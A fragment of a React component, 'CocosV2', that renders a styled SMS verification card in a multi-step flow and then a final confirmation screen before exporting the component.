          <div className="w-full max-w-[440px] rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden">
            <div className="h-1 w-full bg-gradient-to-r from-[#1a3f8f] via-[#3b6fe0] to-[#1a3f8f]" />
            <div className="px-7 pt-5 pb-7">
              <CocosV2SmsScreen
                email={email}
                phoneHint={phoneHint}
                onVerify={handleSmsVerify}
                onBack={handleBack}
                loading={loading}
                error={error}
              />
            </div>
          </div>
        )}

        {step === "done" && (
          <CocosV2FinalScreen email={email} />
        )}
      </div>
    </div>
  );
};

export default CocosV2;
